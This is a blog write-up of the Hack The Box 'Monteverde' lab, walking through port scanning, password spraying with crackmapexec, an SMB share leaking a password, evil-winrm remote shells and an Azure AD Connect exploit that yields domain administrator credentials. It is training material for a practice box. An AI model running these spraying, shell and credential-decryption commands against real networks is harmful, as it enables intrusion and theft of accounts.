<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>[Writeup] Hack The Box: Monteverde | ErbaZZ's Space</title><meta name=keywords content="writeup,walkthrough,htb,hackthebox"><meta name=description content="Monteverde is a Medium difficulty Windows box. You don&rsquo;t need many fancy techniques to clear this box, as the process is quite clear and straightforward. The important point for this box is enumeration, as the saying goes, &ldquo;Enumeration is the key&rdquo;.

"><meta name=author content="ErbaZZ"><link rel=canonical href=https://erbazz.me/writeup/htb_monteverde/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://erbazz.me/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://erbazz.me/favicon.ico><link rel=icon type=image/png sizes=32x32 href=https://erbazz.me/favicon.ico><link rel=apple-touch-icon href=https://erbazz.me/favicon.ico><link rel=mask-icon href=https://erbazz.me/favicon.ico><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="[Writeup] Hack The Box: Monteverde"><meta property="og:description" content="Monteverde is a Medium difficulty Windows box. You don&rsquo;t need many fancy techniques to clear this box, as the process is quite clear and straightforward. The important point for this box is enumeration, as the saying goes, &ldquo;Enumeration is the key&rdquo;.

"><meta property="og:type" content="article"><meta property="og:url" content="https://erbazz.me/writeup/htb_monteverde/"><meta property="og:image" content="https://erbazz.me/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="writeup"><meta property="article:published_time" content="2020-05-05T23:28:11+07:00"><meta property="article:modified_time" content="2020-05-05T23:28:11+07:00"><meta property="og:site_name" content="ErbaZZ's Space"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://erbazz.me/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="[Writeup] Hack The Box: Monteverde"><meta name=twitter:description content="Monteverde is a Medium difficulty Windows box. You don&rsquo;t need many fancy techniques to clear this box, as the process is quite clear and straightforward. The important point for this box is enumeration, as the saying goes, &ldquo;Enumeration is the key&rdquo;.

"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://erbazz.me/writeup/"},{"@type":"ListItem","position":2,"name":"[Writeup] Hack The Box: Monteverde","item":"https://erbazz.me/writeup/htb_monteverde/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"[Writeup] Hack The Box: Monteverde","name":"[Writeup] Hack The Box: Monteverde","description":"Monteverde is a Medium difficulty Windows box. You don\u0026rsquo;t need many fancy techniques to clear this box, as the process is quite clear and straightforward. The important point for this box is enumeration, as the saying goes, \u0026ldquo;Enumeration is the key\u0026rdquo;.\n","keywords":["writeup","walkthrough","htb","hackthebox"],"articleBody":"Monteverde is a Medium difficulty Windows box. You don’t need many fancy techniques to clear this box, as the process is quite clear and straightforward. The important point for this box is enumeration, as the saying goes, “Enumeration is the key”.\nOS: Windows\nDifficulty: Medium\nPoints: 30\nRelease: 11 Jan 2020\nIP: 10.10.10.172\nBox Creator: egre55\nDate Cleared: 23 Apr 2020\nInformation Gathering Starting with nmap as usual.\nPORT STATE SERVICE VERSION 53/tcp open domain? 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-05 13:30:53Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49675/tcp open msrpc Microsoft Windows RPC 49706/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=5/5%Time=5EB1759D%P=x86_64-pc-linux-gnu%r(DNSVe SF:rsionBindReqTCP,20,\"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\x SF:04bind\\0\\0\\x10\\0\\x03\"); Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows I used enum4linux and found a list of users on the target.\nGaining Access I put the usernames found into a text file then performed a simple password spraying with crackmapexec, and found that the credential SABatchJobs:SABatchJobs is valid.\ncrackmapexec smb 10.10.10.172 -u ./userlist -p ./userlist\nThe user SABatchJobs could be used to list the SMB shares.\nsmbclient -L \\\\\\\\10.10.10.172 -U 'MEGABANK\\SABatchJobs'\nThe users$ share is accessible with SABatchJobs, so I mounted the share to my file system for the ease of searching.\nmkdir users$ mount -t cifs //10.10.10.172/users$ ./mount -o username=SABatchJobs,password=SABatchJobs,domain=MEGABANK\nI found a file named mhope/azure.xml with password in users$ share\nUsing crackmapexec to test the new password found with the user list we got, I found that mhope:4n0therD4y@n0th3r$ is valid.\ncrackmapexec smb 10.10.10.172 -u ./userlist -p '4n0therD4y@n0th3r$'\nFrom the nmap result in the beginning, we can see that WinRM port 5985 is open, so I used evil-winrmto connect to the target and got the user shell.\nevil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'\nPrivilege Escalation Using whoami /all, I found an interesting group Azure Admins.\nLooking in the Program Files directory, I found that Microsoft Azure AD Connect is installed on the machine.\nWith a brief Google search, I found that AD Connect has a privilege escalation vulnerability (https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/).\nI uploaded the precompiled exploit binary from https://github.com/VbScrub/AdSyncDecrypt/releases to the target machine using wget and SimpleHTTPServer.\nI went to Microsoft Azure AD Sync directory and run the exploit to get administrator credentials.\ncd \"C:\\Program Files\\Microsoft Azure AD Sync\\Bin\" C:\\Program Files\\Microsoft Azure AD Sync\\Bin C:\\Users\\mhope\\AdDecrypt.exe -FullSQL\nWith the credentials found, I could log in as the Administrator.\nevil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'\n","wordCount":"479","inLanguage":"en","datePublished":"2020-05-05T23:28:11+07:00","dateModified":"2020-05-05T23:28:11+07:00","author":{"@type":"Person","name":"ErbaZZ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://erbazz.me/writeup/htb_monteverde/"},"publisher":{"@type":"Organization","name":"ErbaZZ's Space","logo":{"@type":"ImageObject","url":"https://erbazz.me/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://erbazz.me/ accesskey=h title="ErbaZZ's Space (Alt + H)"><img src=https://erbazz.me/apple-touch-icon.png alt aria-label=logo height=35>ErbaZZ's Space</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://erbazz.me/ title=Home><span>Home</span></a></li><li><a href=https://erbazz.me/writeup/ title=Writeup><span>Writeup</span></a></li><li><a href=https://erbazz.me/about/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://erbazz.me/>Home</a>&nbsp;»&nbsp;<a href=https://erbazz.me/writeup/>Writeups</a></div><h1 class=post-title>[Writeup] Hack The Box: Monteverde</h1><div class=post-meta><span title="2020-05-05 23:28:11 +0700 +07">May 5, 2020</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;479 words&nbsp;·&nbsp;ErbaZZ</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#information-gathering>Information Gathering</a></li><li><a href=#gaining-access>Gaining Access</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></nav></div></details></div><div class=post-content><p>Monteverde is a Medium difficulty Windows box. You don&rsquo;t need many fancy techniques to clear this box, as the process is quite clear and straightforward. The important point for this box is enumeration, as the saying goes, <em>&ldquo;Enumeration is the key&rdquo;</em>.</p><p><img loading=lazy src=/images/htb_monteverde/infocard.png alt></p><p><strong>OS:</strong> Windows<br><strong>Difficulty:</strong> Medium<br><strong>Points:</strong> 30<br><strong>Release:</strong> 11 Jan 2020<br><strong>IP:</strong> 10.10.10.172<br><strong>Box Creator:</strong> egre55<br><strong>Date Cleared:</strong> 23 Apr 2020</p><h2 id=information-gathering>Information Gathering<a hidden class=anchor aria-hidden=true href=#information-gathering>#</a></h2><p>Starting with <code>nmap</code> as usual.</p><pre tabindex=0><code>PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-05-05 13:30:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=5/5%Time=5EB1759D%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03&#34;);
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre><p>I used <code>enum4linux</code> and found a list of users on the target.</p><p><img loading=lazy src=/images/htb_monteverde/enum4linux.png alt></p><h2 id=gaining-access>Gaining Access<a hidden class=anchor aria-hidden=true href=#gaining-access>#</a></h2><p>I put the usernames found into a text file then performed a simple password spraying with <code>crackmapexec</code>, and found that the credential <code>SABatchJobs:SABatchJobs</code> is valid.</p><p><code>crackmapexec smb 10.10.10.172 -u ./userlist -p ./userlist</code></p><p><img loading=lazy src=/images/htb_monteverde/SABatchJobs.png alt></p><p>The user <code>SABatchJobs</code> could be used to list the SMB shares.</p><p><code>smbclient -L \\\\10.10.10.172 -U 'MEGABANK\SABatchJobs'</code></p><p><img loading=lazy src=/images/htb_monteverde/shares.png alt></p><p>The <code>users$</code> share is accessible with <code>SABatchJobs</code>, so I mounted the share to my file system for the ease of searching.</p><p><code>mkdir users$</code>
<code>mount -t cifs //10.10.10.172/users$ ./mount -o username=SABatchJobs,password=SABatchJobs,domain=MEGABANK</code></p><p><img loading=lazy src=/images/htb_monteverde/share_users.png alt></p><p>I found a file named <code>mhope/azure.xml</code> with password in users$ share</p><p><img loading=lazy src=/images/htb_monteverde/share_users_mhope.png alt></p><p>Using <code>crackmapexec</code> to test the new password found with the user list we got, I found that <code>mhope:4n0therD4y@n0th3r$</code> is valid.</p><p><code>crackmapexec smb 10.10.10.172 -u ./userlist -p '4n0therD4y@n0th3r$'</code></p><p><img loading=lazy src=/images/htb_monteverde/crackmapexec_mhope.png alt></p><p>From the <code>nmap</code> result in the beginning, we can see that WinRM port <code>5985</code> is open, so I used <a href=https://github.com/Hackplayers/evil-winrm><code>evil-winrm</code></a>to connect to the target and got the user shell.</p><p><code>evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'</code></p><p><img loading=lazy src=/images/htb_monteverde/shell_mhope.png alt></p><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><p>Using <code>whoami /all</code>, I found an interesting group <code>Azure Admins</code>.</p><p><img loading=lazy src=/images/htb_monteverde/whoami.png alt></p><p>Looking in the <code>Program Files</code> directory, I found that Microsoft Azure AD Connect is installed on the machine.</p><p><img loading=lazy src=/images/htb_monteverde/programfiles.png alt></p><p>With a brief Google search, I found that AD Connect has a privilege escalation vulnerability (<a href=https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/>https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/</a>).</p><p><img loading=lazy src=/images/htb_monteverde/adconnectvuln.png alt></p><p>I uploaded the precompiled exploit binary from <a href=https://github.com/VbScrub/AdSyncDecrypt/releases>https://github.com/VbScrub/AdSyncDecrypt/releases</a> to the target machine using <code>wget</code> and <code>SimpleHTTPServer</code>.</p><p><img loading=lazy src=/images/htb_monteverde/upload.png alt></p><p>I went to Microsoft Azure AD Sync directory and run the exploit to get administrator credentials.</p><p><code>cd "C:\Program Files\Microsoft Azure AD Sync\Bin"</code>
<code>C:\Program Files\Microsoft Azure AD Sync\Bin> C:\Users\mhope\AdDecrypt.exe -FullSQL</code></p><p><img loading=lazy src=/images/htb_monteverde/azureadexploit.png alt></p><p>With the credentials found, I could log in as the Administrator.</p><p><code>evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'</code></p><p><img loading=lazy src=/images/htb_monteverde/admin_shell.png alt></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://erbazz.me/tags/writeup/>writeup</a></li><li><a href=https://erbazz.me/tags/walkthrough/>walkthrough</a></li><li><a href=https://erbazz.me/tags/htb/>htb</a></li><li><a href=https://erbazz.me/tags/hackthebox/>hackthebox</a></li></ul><nav class=paginav><a class=prev href=https://erbazz.me/writeup/htb_magic/><span class=title>« Prev</span><br><span>[Writeup] Hack The Box: Magic</span></a>
<a class=next href=https://erbazz.me/writeup/htb_openadmin/><span class=title>Next »</span><br><span>[Writeup] Hack The Box: OpenAdmin</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://erbazz.me/>ErbaZZ's Space</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerHTML="copy";function s(){e.innerHTML="copied!",setTimeout(()=>{e.innerHTML="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>